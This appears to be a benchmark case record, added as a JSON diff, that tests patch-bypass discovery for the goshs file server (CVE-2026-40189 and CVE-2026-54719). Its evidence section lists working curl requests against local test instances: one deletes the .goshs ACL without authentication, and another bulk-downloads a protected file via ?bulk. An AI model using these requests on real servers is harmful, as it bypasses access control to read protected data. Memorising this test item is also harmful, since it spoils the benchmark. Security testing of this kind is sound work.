@@ -1,0 +1,122 @@
+{
+  "eval_id": "PCBV2-0122",
+  "case_id": "goshs-cve-2026-54719",
+  "product": "goshs",
+  "app_purpose": "file_server",
+  "language": "Go",
+  "root_cause": "Broken_Access_Control",
+  "mechanism_family": "authorization_inconsistency_alternate_route",
+  "cve_pair": {
+    "original_cve": "CVE-2026-40189",
+    "bypass_cve": "CVE-2026-54719",
+    "original_published": "2026-04-09",
+    "bypass_published": "2026-06-08"
+  },
+  "versions": {
+    "v0": {
+      "identifier": "v2.0.0-beta.3",
+      "ref": "goshs v2.0.0-beta.3 (tar.gz binary)",
+      "compose_profile": "v0",
+      "image": null,
+      "source_url": "https://github.com/goshs-labs/goshs",
+      "base_url": "http://127.0.0.1:55130"
+    },
+    "v1": {
+      "identifier": "v2.1.0",
+      "ref": "goshs v2.1.0 (deb binary)",
+      "compose_profile": "v1",
+      "image": null,
+      "source_url": "https://github.com/goshs-labs/goshs",
+      "base_url": "http://127.0.0.1:55131"
+    },
+    "v2": {
+      "identifier": "v2.1.1",
+      "ref": "goshs v2.1.1 (deb binary)",
+      "compose_profile": "v2",
+      "image": null,
+      "source_url": "https://github.com/goshs-labs/goshs",
+      "base_url": "http://127.0.0.1:55132"
+    }
+  },
+  "flag": {
+    "resource": "protected canary under the per-folder .goshs ACL boundary",
+    "placement": "/data/root/protected/canary.txt planted by compose entrypoint from $PCB_FLAG; the folder is gated by .goshs basic-auth (admin:admin), so normal reads return 401",
+    "detect": "flag token in the HTTP body (ZIP contents for the bulk residual; plain read for the seed)",
+    "class_kind": "read-exfil"
+  },
+  "given_to_method": [
+    "v1 source",
+    "patch_real.diff",
+    "original_poc.py",
+    "v1 env (profile v1)"
+  ],
+  "held_out": [
+    "_heldout/bypass_poc.py",
+    "v0 source",
+    "v2 source"
+  ],
+  "evidence": {
+    "advisory_url": "https://github.com/goshs-labs/goshs/security/advisories/GHSA-rmxw-pq4x-3fvh",
+    "fix_reference": "https://github.com/goshs-labs/goshs/commit/7cf911a26ace737e1a55b7dc073e307a25f7fd1d (v2.1.1); CVE-2026-40189 fix f212c4f4 (v2.1.0)",
+    "incomplete_fix_quote": "bulkDownload ... streams the contents back as a ZIP without ever calling findEffectiveACL/applyCustomAuth. It is dispatched from earlyBreakParameters (?bulk) before the normal doDir/doFile/sendFile flow that performs the ACL check. An unauthenticated attacker can therefore read any file under the webroot protected solely by a .goshs ACL",
+    "repro_log": "repro.log",
+    "commands": [
+      "curl http://127.0.0.1:55130/protected/.goshs?delete  # v0 seed: delete ACL then read canary",
+      "curl http://127.0.0.1:55131/protected/.goshs?delete  # v1 seed: 401 blocked",
+      "curl http://127.0.0.1:55131/?bulk&file=/protected/canary.txt  # v1 residual: ZIP with flag",
+      "curl http://127.0.0.1:55132/?bulk&file=/protected/canary.txt  # v2 residual: blocked"
+    ],
+    "artifact_sha256": {
+      "case.json": "0bbc4f9fe53455791919429f5ae719d6117db301c114cfc40b469195d9c769a0",
+      "repro.log": "8405ff600722210ae528495d2d3f844a924da0bd406e584213da296fb09f5f85",
+      "docker-compose.yml": "5f11b1c7756ccf8b26236d65c127098c3b0708d1455752479e3c9663d90d6a6a",
+      "oracle.py": "df69e0ef1b01bda79ea1f0b02b316950e8c060b74bcd9767b54bce62a398208a",
+      "original_poc.py": "ae76273023143af7b81325b557144e8e254a580d90f1dee26e00b62d798a0216",
+      "patch.diff": "0bf56ebfc8d775e7bb5e3551249be6f9c1b7a44e0edaa078342d0482a778a2cd",
+      "Dockerfile": "adeafe9d637aed9353dbe8ab6a73640f947927ed55c33d20870bcc476e4087a3",
+      "_heldout/bypass_poc.py": "afc8366ee7a983dff0efabffac4a32916d72fe567b08ba9ef71c40fe44a5333b",
+      "README.md": "3c6b096388b7acb35862ab6c26341e35028b6ad6b5b612cba3b1788915a76350"
+    }
+  },
+  "labels": {
+    "quality_tier": "gold",
+    "tier": "full_app",
+    "is_dos": false,
+    "clean_for": {}
+  },
+  "status": {
+    "classification": "strict_gold",
+    "review_reason": "Official goshs release binaries; per-folder .goshs ACL scenario from the advisory PoC"
+  },
+  "provenance": {
+    "source": "public:NVD_fix_pattern",
+    "verified": "runtime_gate_passed",
+    "notes": [
+      "NVD description for CVE-2026-54719 explicitly states it is a bypass of the fix for CVE-2026-40189 (same authorization-inconsistency root cause on a read route). Built 2026-08-01. seed=unauthenticated ?delete of .goshs then read canary: reaches on v2.0.0-beta.3, blocked on v2.1.0; residual=?bulk zip-download of protected canary: reaches on v2.1.0, blocked on v2.1.1.",
+      "2026-10-11: patch.diff reclassified as internal guard-evolution doc (PATCH_DIFF_AUDIT_2026-10-11); method-visible diff is patch_real.diff only; patch.diff excluded from method input packages."
+    ]
+  },
+  "schema_version": "strict-1",
+  "execution": {
+    "run_mode": "real-server-http",
+    "software_origin": "official_release",
+    "full_application": true,
+    "source_lift": false,
+    "external_trigger": "http",
+    "image_digest": null,
+    "source_commit": "7cf911a26ace737e1a55b7dc073e307a25f7fd1d"
+  },
+  "oracle": {
+    "variant": "same_sink",
+    "seed": "original_poc.py",
+    "residual": "_heldout/bypass_poc.py",
+    "checks": {
+      "seed_v0_reaches": true,
+      "seed_v1_blocked": true,
+      "residual_v1_reaches": true,
+      "residual_v2_blocked": true
+    },
+    "flag_resource": "/data/root/protected/canary.txt",
+    "detector": "flag token substring in response body"
+  }
+}
